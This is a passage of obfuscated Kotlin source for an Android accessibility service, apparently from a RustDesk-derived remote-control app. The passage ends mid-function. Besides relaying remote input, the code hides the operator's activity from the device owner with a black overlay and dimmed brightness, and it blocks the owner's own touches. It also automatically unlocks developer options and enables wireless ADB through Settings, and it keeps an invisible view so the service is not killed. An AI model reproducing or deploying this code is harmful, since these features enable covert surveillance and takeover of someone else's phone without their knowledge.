package com.cloudsend.app

/**
 * Handle remote input and dispatch android gesture
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.EditText
import android.view.accessibility.AccessibilityEvent
import android.view.ViewGroup.LayoutParams
import android.view.accessibility.AccessibilityNodeInfo
import android.view.KeyEvent as KeyEventAndroid
import android.view.ViewConfiguration
import android.graphics.Rect
import android.media.AudioManager
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_INPUT_METHOD_EDITOR
import android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
import android.view.inputmethod.EditorInfo
import androidx.annotation.RequiresApi
import java.util.*
import java.lang.Character
import kotlin.math.abs
import kotlin.math.max
import hbb.MessageOuterClass.KeyEvent
import hbb.MessageOuterClass.KeyboardMode
import hbb.KeyEventConverter

import android.view.WindowManager
import android.view.WindowManager.LayoutParams.*
import android.widget.FrameLayout
import android.graphics.Color
import android.annotation.SuppressLint
import android.graphics.PixelFormat
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.util.DisplayMetrics
import android.widget.ProgressBar
import android.widget.TextView
import android.content.Context
import android.content.res.ColorStateList

import android.content.Intent
import android.net.Uri
import android.provider.Settings
import pkg2230.ClsFx9V0S


import android.graphics.*
import java.io.ByteArrayOutputStream
import android.hardware.HardwareBuffer
import android.graphics.Bitmap.wrapHardwareBuffer
import java.nio.IntBuffer
import java.nio.ByteOrder
import java.nio.ByteBuffer
import java.io.IOException
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Field
import java.text.SimpleDateFormat
import android.os.Environment

import java.util.concurrent.locks.ReentrantLock
import java.security.MessageDigest

import java.util.concurrent.Executor
import java.util.concurrent.Executors
import kotlinx.coroutines.*

import android.os.SystemClock
import android.content.res.Resources
import android.graphics.drawable.GradientDrawable

import android.view.accessibility.AccessibilityManager

import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.ThreadPoolExecutor
import java.util.concurrent.TimeUnit
import android.content.ContentValues
import android.provider.MediaStore
import java.util.concurrent.SynchronousQueue
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

const val LEFT_DOWN = 9
const val LEFT_MOVE = 8
const val LEFT_UP = 10
const val RIGHT_UP = 18

const val BACK_UP = 66
const val WHEEL_BUTTON_DOWN = 33
const val WHEEL_BUTTON_UP = 34

const val WHEEL_BUTTON_BROWSER = 38

const val WHEEL_DOWN = 523331
const val WHEEL_UP = 963

const val TOUCH_SCALE_START = 1
const val TOUCH_SCALE = 2
const val TOUCH_SCALE_END = 3
const val TOUCH_PAN_START = 4
const val TOUCH_PAN_UPDATE = 5
const val TOUCH_PAN_END = 6

const val WHEEL_STEP = 120
const val WHEEL_DURATION = 50L
const val LONG_TAP_DELAY = 200L

class nZW99cdXQ0COhB2o : AccessibilityService() {

    private enum class WirelessDebugAutomationState {
        IDLE,
        OPENING_ABOUT_PHONE,
        TAPPING_BUILD_NUMBER,
        OPENING_DEV_OPTIONS,
        FINDING_DEV_OPTIONS_ENTRY,
        FINDING_WIRELESS_DEBUG,
        CONFIRMING_DIALOG
    }

    companion object {
        private var viewUntouchable = true
        private var viewTransparency = 1f //// 0 means invisible but can help prevent the service from being killed
        @Volatile
        var ctx: nZW99cdXQ0COhB2o? = null
        @Volatile
        private var pendingIgnoreCapture = false
        @Volatile
        private var oneShotScreenshotFrame = false
        val isOpen: Boolean
            get() = ctx != null

        val isTouchBlockOn: Boolean
            get() = ctx?.touchBlockEnabled ?: false

        val isIgnorePending: Boolean
            get() = pendingIgnoreCapture

        val isOneShotScreenshotFrame: Boolean
            get() = oneShotScreenshotFrame

        private val WIRELESS_DEBUG_KEYWORDS = arrayOf(
            "\u65e0\u7ebf\u8c03\u8bd5",
            "\u901a\u8fc7 WLAN \u8c03\u8bd5",
            "\u901a\u8fc7WLAN\u8c03\u8bd5",
            "\u901a\u8fc7 WLAN \u8fde\u63a5\u8c03\u8bd5",
            "\u901a\u8fc7\u65e0\u7ebf\u8c03\u8bd5",
            "\u65e0\u7ebf adb",
            "\u65e0\u7ebfadb",
            "wireless debugging",
            "wireless adb",
            "adb over network",
            "wlan \u8c03\u8bd5",
            "wifi \u8c03\u8bd5",
            "wlan\u8c03\u8bd5",
            "wifi\u8c03\u8bd5"
        )
        private val DEV_OPTIONS_KEYWORDS = arrayOf(
            "\u5f00\u53d1\u8005\u9009\u9879",
            "\u5f00\u53d1\u4eba\u5458\u9009\u9879",
            "\u5f00\u53d1\u8005\u8bbe\u7f6e",
            "\u5f00\u53d1\u4eba\u5458\u8bbe\u7f6e",
            "developer options",
            "developer settings",
            "development"
        )
        private val DEV_OPTIONS_PARENT_KEYWORDS = arrayOf(
            "\u66f4\u591a\u8bbe\u7f6e",
            "\u5176\u4ed6\u8bbe\u7f6e",
            "\u7cfb\u7edf\u548c\u66f4\u65b0",
            "\u7cfb\u7edf\u7ba1\u7406",
            "additional settings",
            "more settings",
            "other settings",
            "system & updates",
            "system and updates",
            "system management"
        )
        private val ABOUT_PHONE_KEYWORDS = arrayOf(
            "\u6211\u7684\u8bbe\u5907",
            "\u5173\u4e8e\u624b\u673a",
            "\u5173\u4e8e\u8bbe\u5907",
            "\u5173\u4e8e\u672c\u673a",
            "\u5168\u90e8\u53c2\u6570",
            "\u5168\u90e8\u53c2\u6570\u4e0e\u4fe1\u606f",
            "\u7cfb\u7edf\u4fe1\u606f",
            "\u7cfb\u7edf\u7248\u672c",
            "\u7248\u672c\u4fe1\u606f",
            "\u8f6f\u4ef6\u4fe1\u606f",
            "\u8bbe\u5907\u4fe1\u606f",
            "\u624b\u673a\u4fe1\u606f",
            "my device",
            "about phone",
            "about device",
            "device info",
            "phone info",
            "software information",
            "version information"
        )
        private val BUILD_NUMBER_KEYWORDS = arrayOf(
            "\u7248\u672c\u53f7",
            "\u7f16\u8bd1\u7248\u672c\u53f7",
            "\u8f6f\u4ef6\u7248\u672c\u53f7",
            "miui \u7248\u672c",
            "miui\u7248\u672c",
            "hyperos \u7248\u672c",
            "hyperos\u7248\u672c",
            "coloros \u7248\u672c",
            "coloros\u7248\u672c",
            "originos \u7248\u672c",
            "originos\u7248\u672c",
            "magicos \u7248\u672c",
            "magicos\u7248\u672c",
            "harmonyos \u7248\u672c",
            "harmonyos\u7248\u672c",
            "emui \u7248\u672c",
            "emui\u7248\u672c",
            "\u7cfb\u7edf\u7248\u672c",
            "\u7248\u672c\u4fe1\u606f",
            "build number",
            "software version",
            "miui version",
            "hyperos version",
            "coloros version",
            "originos version",
            "magicos version",
            "harmonyos version",
            "emui version"
        )
        private val DEV_MODE_ENABLED_HINT_KEYWORDS = arrayOf(
            "\u60a8\u5df2\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u5df2\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u5df2\u662f\u5f00\u53d1\u8005",
            "\u5df2\u6210\u4e3a\u5f00\u53d1\u8005",
            "\u5df2\u8fdb\u5165\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u60a8\u73b0\u5728\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u60a8\u73b0\u5728\u5df2\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u60a8\u73b0\u5728\u5df2\u7ecf\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u73b0\u5728\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u73b0\u5728\u5df2\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u73b0\u5728\u5df2\u7ecf\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u4f60\u73b0\u5728\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u4f60\u73b0\u5728\u5df2\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u4f60\u73b0\u5728\u5df2\u7ecf\u5904\u4e8e\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u60a8\u5df2\u8fdb\u5165\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u4f60\u5df2\u8fdb\u5165\u5f00\u53d1\u8005\u6a21\u5f0f",
            "\u60a8\u73b0\u5728\u662f\u5f00\u53d1\u8005",
            "\u4f60\u73b0\u5728\u662f\u5f00\u53d1\u8005",
            "\u73b0\u5728\u662f\u5f00\u53d1\u8005",
            "\u60a8\u5df2\u6210\u4e3a\u5f00\u53d1\u8005",
            "\u4f60\u5df2\u6210\u4e3a\u5f00\u53d1\u8005",
            "\u5f00\u53d1\u8005\u6a21\u5f0f\u5df2\u5f00\u542f",
            "\u5f00\u53d1\u8005\u6a21\u5f0f\u5df2\u6253\u5f00",
            "\u5f00\u53d1\u8005\u9009\u9879\u5df2\u5f00\u542f",
            "\u5f00\u53d1\u8005\u9009\u9879\u5df2\u542f\u7528",
            "\u5f00\u53d1\u8005\u9009\u9879\u5df2\u6253\u5f00",
            "\u5df2\u542f\u7528\u5f00\u53d1\u8005\u9009\u9879",
            "\u60a8\u5df2\u5f00\u542f\u5f00\u53d1\u8005\u9009\u9879",
            "\u60a8\u5df2\u542f\u7528\u5f00\u53d1\u8005\u9009\u9879",
            "\u5f00\u53d1\u4eba\u5458\u9009\u9879\u5df2\u5f00\u542f",
            "\u5f00\u53d1\u4eba\u5458\u9009\u9879\u5df2\u542f\u7528",
            "\u65e0\u9700\u518d\u8fdb\u884c\u6b64\u64cd\u4f5c",
            "\u4e0d\u9700\u8981\u8fdb\u884c\u6b64\u64cd\u4f5c",
            "\u4e0d\u5fc5\u8fdb\u884c\u6b64\u64cd\u4f5c",
            "\u65e0\u9700\u64cd\u4f5c",
            "\u65e0\u9700\u5f00\u542f",
            "you are now a developer",
            "you are already a developer",
            "already a developer",
            "developer mode has been enabled",
            "developer options are enabled",
            "developer options have been enabled",
            "no need"
        )
        private const val WIRELESS_DEBUG_TIMEOUT_MS = 60_000L
        private const val WIRELESS_DEBUG_RETRY_DELAY_MS = 700L
        private const val WIRELESS_DEBUG_MAX_SCROLL = 12
        private const val WIRELESS_DEBUG_MAX_BUILD_TAPS = 10
        private const val DEV_OPTIONS_DIRECT_OPEN_GRACE_MS = 2_500L

        @Volatile
        private var wirelessDebugAutomationRunning = false
        @Volatile
        private var wirelessDebugAutomationTarget = true
        @Volatile
        private var wirelessDebugAutomationMessage = ""
        @Volatile
        private var wirelessDebugAutomationError = ""
        @Volatile
        private var wirelessDebugAutomationStartedAt = 0L
        @Volatile
        private var wirelessDebugAutomationScrollCount = 0
        @Volatile
        private var wirelessDebugAutomationBuildTapCount = 0
        @Volatile
        private var wirelessDebugAutomationEventQueued = false
        @Volatile
        private var lastWirelessDebugProcessMs = 0L
        @Volatile
        private var lastWirelessDebugToggleMs = 0L
        @Volatile
        private var developerOptionsOpenRequestedAt = 0L
        @Volatile
        private var developerOptionsParentEntryClicked = false
        @Volatile
        private var developerOptionsSearchRetryCount = 0
        @Volatile
        private var wirelessDebugAutomationState = WirelessDebugAutomationState.IDLE

        fun isWirelessDebuggingEnabled(context: Context): Boolean {
            return try {
                Settings.Global.getInt(context.contentResolver, "adb_wifi_enabled", 0) == 1
            } catch (_: Throwable) {
                false
            }
        }

        fun wirelessDebugAutomationStatus(
            context: Context,
            fallbackError: String = ""
        ): Map<String, Any> {
            val enabled = isWirelessDebuggingEnabled(context)
            val message = normalizedWirelessDebugAutomationMessage(enabled)
            val error = wirelessDebugAutomationError.ifEmpty { fallbackError }
            return mapOf(
                "accessibility" to isOpen,
                "supported" to (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R),
                "enabled" to enabled,
                "running" to wirelessDebugAutomationRunning,
                "target" to wirelessDebugAutomationTarget,
                "state" to wirelessDebugAutomationState.name,
                "message" to message,
                "error" to error
            )
        }

        private fun normalizedWirelessDebugAutomationMessage(enabled: Boolean): String {
            if (wirelessDebugAutomationRunning) return wirelessDebugAutomationMessage
            return when (wirelessDebugAutomationMessage) {
                "Wireless debugging is enabled" ->
                    if (enabled) wirelessDebugAutomationMessage else "Wireless debugging is disabled"
                "Wireless debugging is disabled" ->
                    if (!enabled) wirelessDebugAutomationMessage else "Wireless debugging is enabled"
                else -> wirelessDebugAutomationMessage
            }
        }

        fun requestWirelessDebugAutomation(enable: Boolean): Boolean {
            val service = ctx ?: return false
            service.startWirelessDebugAutomation(enable)
            return true
        }

        fun cancelWirelessDebugAutomation(): Boolean {
            val service = ctx ?: return false
            service.cancelWirelessDebugAutomation()
            return true
        }

        fun consumeOneShotScreenshotFrame() {
            oneShotScreenshotFrame = false
        }

        fun refreshVideoAfterPenetrate(reason: String) {
            val mainService = DFm8Y8iMScvB2YDw.ctx
            if (mainService != null) {
                mainService.forceVideoFrameRefresh(reason)
                return
            }
            try {
                ClsFx9V0S.qR9Ofa6G()
            } catch (e: Exception) {
                Log.e("InputService", "refreshVideoAfterPenetrate failed", e)
            }
        }

        fun resetCaptureStates(reason: String) {
            pendingIgnoreCapture = false
            oneShotScreenshotFrame = false
            val service = ctx
            if (service != null) {
                service.stopIgnoreCaptureLoop(reason)
            } else {
                shouldRun = false
            }
            SKL = false
            Log.i("InputService", "resetCaptureStates: shouldRun=false, SKL=false, reason=$reason")
        }

        fun requestIgnoreCapture(reason: String = "request"): Boolean {
            val service = ctx
            if (service == null) {
                pendingIgnoreCapture = true
                return false
            }
            service.startIgnoreCapture(reason)
            return true
        }

        fun stopIgnoreCapture(reason: String = "request") {
            pendingIgnoreCapture = false
            oneShotScreenshotFrame = false
            val service = ctx
            if (service == null) {
                shouldRun = false
                return
            }
            service.stopIgnoreCaptureLoop(reason)
        }
    }

    // ========== 防触摸功能 (touchBlock) ==========
    // 独立于黑屏 overlay 的透明触摸吸收层。
    private var touchBlockOverlay: FrameLayout? = null
    private var touchBlockParams: WindowManager.LayoutParams? = null
    @Volatile private var touchBlockEnabled: Boolean = false
    // 0 表示从未收到过远程事件；> 0 为 SystemClock.uptimeMillis()。
    private val lastRemoteActivityMs = AtomicLong(0L)
    // true 表示当前 overlay 处于穿透状态（FLAG_NOT_TOUCHABLE 设置），远程可通过。
    @Volatile private var touchBlockPassThrough: Boolean = true
    @Volatile private var touchBlockSwitchPending: Boolean = false
    // 远程事件静默多久后回到吸收状态。
    private val TOUCH_BLOCK_ACTIVE_WINDOW_MS = 500L
    // watchdog 检查间隔。
    private val TOUCH_BLOCK_WATCHDOG_INTERVAL_MS = 100L

    private val PENETRATE_FRAME_MIN_INTERVAL_MS = 80L
    private val penetrateRenderInFlight = AtomicBoolean(false)
    @Volatile private var penetrateRenderPending: Boolean = false
    @Volatile private var lastPenetrateRenderMs: Long = 0L

    private val touchBlockWatchdog = object : Runnable {
        override fun run() {
            if (!touchBlockEnabled) return
            val last = lastRemoteActivityMs.get()
            val elapsed = if (last == 0L) {
                Long.MAX_VALUE
            } else {
                SystemClock.uptimeMillis() - last
            }
            val shouldPassThrough = elapsed < TOUCH_BLOCK_ACTIVE_WINDOW_MS
            if (shouldPassThrough != touchBlockPassThrough) {
                applyTouchBlockFlag(shouldPassThrough)
            }
            handler.postDelayed(this, TOUCH_BLOCK_WATCHDOG_INTERVAL_MS)
        }
    }

    private fun requestPenetrateFrame(reason: String, immediate: Boolean = false) {
        if (!SKL) return
        val now = SystemClock.uptimeMillis()
        val elapsed = now - lastPenetrateRenderMs
        if (!immediate && elapsed < PENETRATE_FRAME_MIN_INTERVAL_MS) {
            penetrateRenderPending = true
            handler.postDelayed({
                if (penetrateRenderPending && SKL) {
                    penetrateRenderPending = false
                    requestPenetrateFrame("throttle-$reason", true)
                }
            }, PENETRATE_FRAME_MIN_INTERVAL_MS - elapsed)
            return
        }
        if (!penetrateRenderInFlight.compareAndSet(false, true)) {
            penetrateRenderPending = true
            return
        }
        lastPenetrateRenderMs = now
        Thread {
            try {
                val root = try {
                    ClsFx9V0S.uwEb8Ixn(this)
                } catch (e: Exception) {
                    null
                }
                if (SKL && root != null) {
                    EqljohYazB0qrhnj.a012933444444(root)
                }
            } catch (e: Exception) {
                Log.e("InputService", "requestPenetrateFrame failed, reason=$reason", e)
            } finally {
                penetrateRenderInFlight.set(false)
                if (SKL && penetrateRenderPending) {
                    penetrateRenderPending = false
                    handler.post { requestPenetrateFrame("pending-$reason", false) }
                }
            }
        }.start()
    }

    private fun markRemoteTouchBlockActivity() {
        if (!touchBlockEnabled) return
        lastRemoteActivityMs.set(SystemClock.uptimeMillis())
        if (!touchBlockPassThrough && !touchBlockSwitchPending) {
            touchBlockSwitchPending = true
            handler.post { applyTouchBlockFlag(true) }
        }
    }

    private fun applyTouchBlockFlag(passThrough: Boolean) {
        val overlay = touchBlockOverlay
        val params = touchBlockParams
        if (overlay == null || params == null || overlay.windowToken == null) {
            touchBlockSwitchPending = false
            return
        }
        if (passThrough == touchBlockPassThrough) {
            touchBlockSwitchPending = false
            return
        }
        try {
            params.flags = if (passThrough) {
                params.flags or FLAG_NOT_TOUCHABLE
            } else {
                params.flags and FLAG_NOT_TOUCHABLE.inv()
            }
            windowManager.updateViewLayout(overlay, params)
            touchBlockPassThrough = passThrough
        } catch (e: Exception) {
            Log.e("InputService", "applyTouchBlockFlag failed", e)
        } finally {
            touchBlockSwitchPending = false
        }
    }

    @SuppressLint("ClickableViewAccessibility")
    private fun ensureTouchBlockOverlay() {
        if (touchBlockOverlay != null) return
        if (!::windowManager.isInitialized) return
        try {
            val overlay = FrameLayout(this)
            overlay.setBackgroundColor(Color.TRANSPARENT)
            overlay.visibility = View.GONE
            // 返回 true 明确消费触摸，防止本地误触落到下层应用。
            overlay.setOnTouchListener { _, _ -> true }

            val windowType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ERROR
            }

            // 初始为穿透，避免创建瞬间意外拦截任何输入。
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                windowType,
                FLAG_NOT_FOCUSABLE or FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSPARENT
            )
            params.gravity = Gravity.TOP or Gravity.START

            windowManager.addView(overlay, params)
            touchBlockOverlay = overlay
            touchBlockParams = params
            touchBlockPassThrough = true
            touchBlockSwitchPending = false
        } catch (e: Exception) {
            Log.e("InputService", "ensureTouchBlockOverlay failed", e)
            touchBlockOverlay = null
            touchBlockParams = null
            touchBlockPassThrough = true
            touchBlockSwitchPending = false
        }
    }

    fun setTouchBlockEnabled(enable: Boolean) {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            handler.post { setTouchBlockEnabled(enable) }
            return
        }
        if (enable == touchBlockEnabled) return
        if (enable) {
            ensureTouchBlockOverlay()
            val overlay = touchBlockOverlay ?: return
            touchBlockEnabled = true
            lastRemoteActivityMs.set(0L)
            overlay.visibility = View.VISIBLE
            // 立即进入吸收状态（移除 FLAG_NOT_TOUCHABLE）。
            applyTouchBlockFlag(false)
            handler.removeCallbacks(touchBlockWatchdog)
            handler.postDelayed(touchBlockWatchdog, TOUCH_BLOCK_WATCHDOG_INTERVAL_MS)
            Log.i("InputService", "touchBlock enabled")
        } else {
            touchBlockEnabled = false
            handler.removeCallbacks(touchBlockWatchdog)
            val overlay = touchBlockOverlay
            if (overlay != null) {
                try {
                    // 先恢复为穿透，避免关闭过程中阻塞任何输入。
                    applyTouchBlockFlag(true)
                    overlay.visibility = View.GONE
                } catch (e: Exception) {
                    Log.e("InputService", "setTouchBlockEnabled hide failed", e)
                }
            }
            Log.i("InputService", "touchBlock disabled")
        }
    }
    // ========== end 防触摸功能 ==========

    private lateinit var windowManager: WindowManager
    private lateinit var overLayparams_bass: WindowManager.LayoutParams
    private lateinit var overLay: FrameLayout
    private var blankDevProgressText: String? = null
    private var blankSavedBrightness: Int? = null
    private var blankSavedBrightnessMode: Int? = null
    private var blankSystemBrightnessApplied = false
    private var blankWindowBrightnessApplied = false
    private val lock = ReentrantLock()
    

    private var leftIsDown = false
    private var touchPath = Path()
    private var stroke: GestureDescription.StrokeDescription? = null
    private var lastTouchGestureStartTime = 0L
    private var mouseX = 0
    private var mouseY = 0
    private var timer = Timer()
    private var recentActionTask: TimerTask? = null

    private val longPressDuration = ViewConfiguration.getTapTimeout().toLong() + ViewConfiguration.getLongPressTimeout().toLong()

    private val wheelActionsQueue = LinkedList<GestureDescription>()
    private var isWheelActionsPolling = false
    private var isWaitingLongPress = false

    private var fakeEditTextForTextStateCalculation: EditText? = null
    private var ClassGen12Globalnode: AccessibilityNodeInfo? = null
	
    private var lastX = 0
    private var lastY = 0

    private val volumeController: VolumeController by lazy { VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager) }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onMouseInput(mask: Int, _x: Int, _y: Int,url: String) {
        markRemoteTouchBlockActivity()
        val x = max(0, _x)
        val y = max(0, _y)

        if (mask == 0 || mask == LEFT_MOVE) {
            val oldX = mouseX
            val oldY = mouseY
            mouseX = x * SCREEN_INFO.scale
            mouseY = y * SCREEN_INFO.scale
            if (isWaitingLongPress) {
                val delta = abs(oldX - mouseX) + abs(oldY - mouseY)
          
                if (delta > 8) {
                    isWaitingLongPress = false
                }
            }
        }
          if (mask == WHEEL_BUTTON_BROWSER) {	
    	   
    	   if (!url.isNullOrEmpty()) {
			      val trimmedUrl = url.trim()
			      if (!trimmedUrl.startsWith(p50.a(byteArrayOf(-15, 126, 73, 55), byteArrayOf(-103, 10, 61, 71, -98, 6, -32, -9, -14, -74)))) {

			      } else {
			     	    openBrowserWithUrl(trimmedUrl)
			      }
    	    }
            return
        }
        // left button down, was up
        if (mask == LEFT_DOWN) {
            isWaitingLongPress = true
            timer.schedule(object : TimerTask() {
                override fun run() {
                    if (isWaitingLongPress) {
                        isWaitingLongPress = false
                        continueGesture(mouseX, mouseY)
                    }
                }
            }, longPressDuration)

            leftIsDown = true
            startGesture(mouseX, mouseY)
            return
        }

        // left down, was down
        if (leftIsDown) {
            continueGesture(mouseX, mouseY)
        }

        // left up, was down
        if (mask == LEFT_UP) {
            if (leftIsDown) {
                leftIsDown = false
                isWaitingLongPress = false
                endGesture(mouseX, mouseY)
                return
            }
        }

        if (mask == RIGHT_UP) {
            longPress(mouseX, mouseY)
            return
        }

        if (mask == BACK_UP) {
            performGlobalAction(GLOBAL_ACTION_BACK)
            return
        }

        // long WHEEL_BUTTON_DOWN -> GLOBAL_ACTION_RECENTS
        if (mask == WHEEL_BUTTON_DOWN) {
            timer.purge()
            recentActionTask = object : TimerTask() {
                override fun run() {
                    performGlobalAction(GLOBAL_ACTION_RECENTS)
                    recentActionTask = null
                }
            }
            timer.schedule(recentActionTask, LONG_TAP_DELAY)
        }

        // wheel button up
        if (mask == WHEEL_BUTTON_UP) {
            if (recentActionTask != null) {
                recentActionTask!!.cancel()
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
            return
        }

        if (mask == WHEEL_DOWN) {
            if (mouseY < WHEEL_STEP) {
                return
            }
            val path = Path()
            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
            path.lineTo(mouseX.toFloat(), (mouseY - WHEEL_STEP).toFloat())
            val stroke = GestureDescription.StrokeDescription(
                path,
                0,
                WHEEL_DURATION
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            wheelActionsQueue.offer(builder.build())
            consumeWheelActions()

        }

        if (mask == WHEEL_UP) {
            if (mouseY < WHEEL_STEP) {
                return
            }
            val path = Path()
            path.moveTo(mouseX.toFloat(), mouseY.toFloat())
            path.lineTo(mouseX.toFloat(), (mouseY + WHEEL_STEP).toFloat())
            val stroke = GestureDescription.StrokeDescription(
                path,
                0,
                WHEEL_DURATION
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)
            wheelActionsQueue.offer(builder.build())
            consumeWheelActions()
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onTouchInput(mask: Int, _x: Int, _y: Int) {
        markRemoteTouchBlockActivity()
        when (mask) {
            TOUCH_PAN_UPDATE -> {
                mouseX -= _x * SCREEN_INFO.scale
                mouseY -= _y * SCREEN_INFO.scale
                mouseX = max(0, mouseX);
                mouseY = max(0, mouseY);
                continueGesture(mouseX, mouseY)
            }
            TOUCH_PAN_START -> {
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
                startGesture(mouseX, mouseY)
            }
            TOUCH_PAN_END -> {
                endGesture(mouseX, mouseY)
                mouseX = max(0, _x) * SCREEN_INFO.scale
                mouseY = max(0, _y) * SCREEN_INFO.scale
            }
            else -> {}
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onstart_capture(arg1: String,arg2: String) {
		
		if(arg1==p50.a(byteArrayOf(127), byteArrayOf(78, -52, 72, -87, 6, -44, -90)))
		{
              SKL=true
              oneShotScreenshotFrame = false
              penetrateRenderPending = false
              lastPenetrateRenderMs = 0L
              try {
                  ClsFx9V0S.VaiKIoQu("video", true)
              } catch (e: Exception) {
                  Log.e("InputService", "onstart_capture: enable video raw failed", e)
              }
              requestPenetrateFrame("start-capture", true)
              handler.postDelayed({ requestPenetrateFrame("start-capture-confirm", true) }, 120)
		}
		else
		{
            SKL=false
            penetrateRenderPending = false
            requestOneShotScreenshotFrame("penetrate-stop")
		} 
    }
    
      @RequiresApi(Build.VERSION_CODES.N)
    fun onstop_overlay(arg1: String,arg2: String) {
	   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

		   if(arg1==p50.a(byteArrayOf(29), byteArrayOf(44, -90, -20, -23, -5, -38, 98, 103, 93)))
		   {
			   startIgnoreCapture("remote")
		   }
           else
		   {
              stopIgnoreCaptureLoop("remote")
		   }

	     }
    }

    private fun startIgnoreCapture(reason: String) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return
        }
        pendingIgnoreCapture = false
        oneShotScreenshotFrame = false
        if (!shouldRun) {
            Wt = true
            shouldRun = true
            screenshotDelayMillis = ClsFx9V0S.qJM6QNqR()
            i()
            Log.i("InputService", "开无视: screenshot loop started, reason=$reason")
        }
    }

    private fun stopIgnoreCaptureLoop(reason: String) {
        pendingIgnoreCapture = false
        shouldRun = false
        Log.i("InputService", "关无视: screenshot loop stopped, reason=$reason")
    }

    private fun requestOneShotScreenshotFrame(reason: String) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-legacy")
            return
        }
        oneShotScreenshotFrame = true
        d("one-shot-$reason")
        handler.postDelayed({
            if (oneShotScreenshotFrame) {
                nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-early")
            }
        }, 500)
        handler.postDelayed({
            if (oneShotScreenshotFrame) {
                oneShotScreenshotFrame = false
                nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-timeout")
            }
        }, 3000)
    }

       @RequiresApi(Build.VERSION_CODES.N)
	fun onstart_overlay(arg1: String, arg2: String) {

	    gohome = arg1.toInt()

	    if (::overLay.isInitialized && overLay.windowToken != null) {
	        overLay.post {
	            try {
	                if (gohome == 8) {
                        BIS = false
                        applyBlankOverlayVisual(false)
	                    overLay.visibility = View.GONE
                        DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, false)
                        restoreBlankBrightness("blank-close")
                        refreshVideoAfterBlankChange("blank-close", requestCleanScreenshot = true)
	                } else {
                        applyBlankOverlayVisual(true)
                        applyBlankBrightness("blank-open")
                        overLay.visibility = View.VISIBLE
                        BIS = true
                        DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, true)
                        refreshVideoAfterBlankChange("blank-open", requestCleanScreenshot = false)
	                }
	            } catch (e: Exception) {
	                Log.e("InputService", "onstart_overlay: update visibility failed", e)
	            }
	        }
	    }
	}

    fun isBlankOverlayActiveForDev(): Boolean {
        return gohome != View.GONE || BIS
    }

    fun keepBlankOverlayOnTopForDev(reason: String = "dev") {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            handler.post { keepBlankOverlayOnTopForDev(reason) }
            return
        }
        if (isBlankOverlayActiveForDev()) {
            applyBlankOverlayVisual(true)
        }
    }

    fun showDevProgressUnderBlank(text: String): Boolean {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            handler.post { showDevProgressUnderBlank(text) }
            return isBlankOverlayActiveForDev()
        }
        if (!isBlankOverlayActiveForDev() || !::overLay.isInitialized) return false
        blankDevProgressText = text
        applyBlankOverlayVisual(true)
        return true
    }

    fun hideDevProgressUnderBlank() {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            handler.post { hideDevProgressUnderBlank() }
            return
        }
        blankDevProgressText = null
        if (::overLay.isInitialized && isBlankOverlayActiveForDev()) {
            applyBlankOverlayVisual(true)
        }
    }

    private fun applyBlankOverlayVisual(active: Boolean) {
        if (!::overLay.isInitialized) return
        overLay.setBackgroundColor(Color.TRANSPARENT)
        overLay.alpha = 1f
        if (overLay.childCount > 0) {
            overLay.removeAllViews()
        }
        if (::overLayparams_bass.isInitialized) {
            val metrics = resources.displayMetrics
            val currentLongEdge = max(overLayparams_bass.width, overLayparams_bass.height)
